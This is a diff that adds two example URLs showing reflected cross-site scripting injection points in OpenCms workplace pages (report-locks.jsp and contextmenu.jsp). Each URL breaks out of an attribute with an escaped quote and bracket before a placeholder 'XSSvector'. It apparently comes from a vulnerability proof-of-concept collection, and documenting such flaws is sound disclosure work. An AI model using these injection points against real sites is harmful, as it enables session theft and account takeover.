@@ -1,0 +1,3 @@
+http://www.example.com/opencms/opencms/system/workplace/commons/report-locks.jsp?resourcelist=null&amp;resource=/demo_de&amp;includerelated=false&quot;&gt;XSSvector
+
+http://www.example.com/opencms/opencms/system/workplace/views/explorer/contextmenu.jsp?resourcelist=/deco_logo.png&amp;acttarget=514f2&quot;&gt;XSSvector
